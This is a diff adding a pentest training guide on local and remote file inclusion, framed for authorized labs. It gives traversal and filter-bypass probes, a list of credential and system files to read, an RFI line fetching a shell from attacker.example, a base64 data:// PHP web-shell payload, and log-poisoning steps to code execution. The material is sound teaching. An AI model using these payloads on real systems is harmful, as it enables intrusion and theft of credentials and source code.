@@ -1,0 +1,170 @@
+---
+title: Local & Remote File Inclusion
+description: LFI and RFI concepts, path traversal, testing methodology, interesting files to read, PHP wrappers, and the common LFI-to-RCE routes — all scoped to authorized labs.
+section: web
+phase: 3
+order: 7
+difficulty: intermediate
+draft: false
+tags: ['lfi', 'rfi', 'file-inclusion', 'path-traversal', 'wrappers', 'rce']
+updated: 2026-08-08
+---
+
+import Alert from '../../../components/ui/Alert.astro';
+import Badge from '../../../components/ui/Badge.astro';
+import CodeBlock from '../../../components/ui/CodeBlock.astro';
+import SourceTag from '../../../components/ui/SourceTag.astro';
+
+## The concepts
+
+### Path traversal
+
+The application builds a file path from your input without validation:
+
+<CodeBlock
+  lang="text"
+  title="Traversal in action"
+  code={`GET /download?file=manual.pdf
+    -> reads  /var/www/app/files/manual.pdf
+
+GET /download?file=../../../../etc/passwd
+    -> reads /etc/passwd             <- outside the webroot
+`}
+/>
+
+### Local File Inclusion (LFI)
+
+A page includes a file **on the same server** based on input:
+
+<CodeBlock
+  lang="text"
+  title="LFI in action"
+  code={`GET /index.php?page=home
+    -> include('home.php')
+
+GET /index.php?page=../../../../etc/passwd
+    -> include reads and renders /etc/passwd
+`}
+/>
+
+### Remote File Inclusion (RFI)
+
+The page includes a file from **another server** you control:
+
+<CodeBlock
+  lang="text"
+  title="RFI in action"
+  code={`GET /index.php?page=http://attacker.example/shell.txt
+    -> include() fetches and executes remote content
+`}
+/>
+
+<SourceTag source="practical" /> RFI is rarer than LFI in modern configs (many PHP installs disable `allow_url_include`), but LFI is still everywhere. The two are tested with the same curiosity: "what happens if I change what gets included?"
+
+## Relationship with path traversal
+
+Traversal and LFI are cousins: both exploit unvalidated file input. Traversal usually just **reads** files (downloads, image resizing); LFI **executes** included content through the application's interpreter. A traversal that only reads is still a serious finding (source code, configs, credentials); an LFI is usually worse because it can become code execution.
+
+## Testing methodology
+
+### 1. Find file inputs
+
+Look for parameters named `page`, `file`, `path`, `include`, `template`, `lang`, `view`, or any value that ends in `.php`/`.html`. These are include candidates.
+
+### 2. Send traversal probes
+
+<CodeBlock
+  lang="text"
+  title="Probing order"
+  code={`?page=../../../../etc/passwd
+?page=....//....//....//etc/passwd     (filter bypass: .../ -> ../)
+?page=%2e%2e%2f%2e%2e%2fetc/passwd     (URL-encoded)
+?page=/etc/passwd                      (absolute path)
+?page=php://filter/convert.base64-encode/resource=index.php
+`}
+/>
+
+- **Purpose:** determine whether the input reaches the file system and how filters treat it.
+- **Expected result:** the `root:x:0:0:...` line, a base64 blob (decode it), or an error.
+- **Investigate next:** which file you can read decides the value of the finding.
+
+### 3. Test with extension handling
+
+If `?page=home` loads `home.php`, the app may append `.php`. Bypass with:
+
+- Null byte (legacy): `?page=../../etc/passwd%00` — rarely works on modern PHP, worth one try.
+- Double extension: `?page=../../etc/passwd%00.png`.
+- Path truncation (legacy): long paths with `./` padding.
+- If `.php` is always appended and nothing works, try **log poisoning** (below).
+
+## Interesting files to read
+
+What you are actually after:
+
+| File | What you learn |
+|---|---|
+| `/etc/passwd` | User accounts; confirms traversal |
+| `/etc/shadow` | Password hashes (needs root — often blocked; try anyway) |
+| `/var/www/html/config.php` | Database credentials |
+| `index.php` / `config.php` (via filter) | Source code → more injection points |
+| `/proc/self/environ` | Environment variables (may contain secrets) |
+| Windows: `C:\Windows\win.ini` | Windows confirmation |
+| Windows: `C:\boot.ini`, `C:\inetpub\wwwroot\web.config` | Windows targets |
+
+## PHP wrappers
+
+PHP's `php://` scheme turns LFI into more powerful primitives:
+
+<CodeBlock
+  lang="text"
+  title="Filter to read source without execution"
+  code={`?page=php://filter/convert.base64-encode/resource=index.php
+   -> base64 of index.php source -> decode locally
+`}
+/>
+
+<CodeBlock
+  lang="text"
+  title="Data wrapper to inject PHP (legacy setups)"
+  code={`?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=
+   (decodes to: <?php system($_GET[c]); ?>)
+`}
+/>
+
+- **`php://filter`** — read file **source** even when the app would execute it. The single most useful wrapper in labs.
+- **`data://`** — inject PHP code if `allow_url_include` is on (RFI-style behaviour locally).
+- **`expect://` / `php://input`** — command execution in specific legacy configurations.
+
+<Alert variant="warning" title="RCE via wrappers">
+  `data://` and friends require permissive PHP configs. Do not assume they work; test them, and treat working code execution as a serious finding to validate carefully in your lab.
+</Alert>
+
+## LFI → RCE: the common routes
+
+LFI is a finding on its own. When it becomes code execution, the usual routes are:
+
+1. **Log poisoning** — inject PHP into a server log (e.g., inside the `User-Agent`), then include that log file:
+   - Send `User-Agent: <?php system($_GET[c]); ?>`
+   - Include `?page=/var/log/apache2/access.log`
+   - Now `?page=...access.log&c=id` executes.
+2. **`/proc/self/environ`** — if the web server exposes env vars, inject PHP into `User-Agent` and include it.
+3. **Session files** — write PHP into your session via a login field, then include the session file (`/var/lib/php/sessions/sess_<id>`).
+4. **Existing upload** — if you can upload a file anywhere (see [File Upload Vulnerabilities](/guides/web/file-upload-vulnerabilities)), include it through the LFI.
+
+<SourceTag source="practical" /> Route 4 is the most reliable in modern labs: combine a successful upload with LFI and you have a stable shell without touching server logs.
+
+## Common mistakes
+
+- **Only trying one depth** of `../` — repeat enough levels or use absolute paths.
+- **Giving up when a filter blocks `../`** — try encoding, `....//`, or wrapper-based reads.
+- **Not reading source code** via `php://filter` — source reveals the include pattern and other bugs.
+- **Assuming LFI is only `etc/passwd`** — the source code and configs are usually the prize.
+- **Forgetting that RFI needs a server you control** and practicing it only against your own lab VM.
+- **Dumping a shell before validating** the inclusion primitive works for reading first.
+
+## Related guides
+
+- [Web Enumeration](/guides/web/web-enumeration) — how you find `?page=` parameters.
+- [File Upload Vulnerabilities](/guides/web/file-upload-vulnerabilities) — the reliable companion for LFI → RCE.
+- [Command Injection](/guides/web/command-injection) — the same "input reaches a powerful sink" mindset.
+- [Web Shells & Initial Access](/guides/web/web-shells-initial-access) — what to do once LFI becomes code execution.
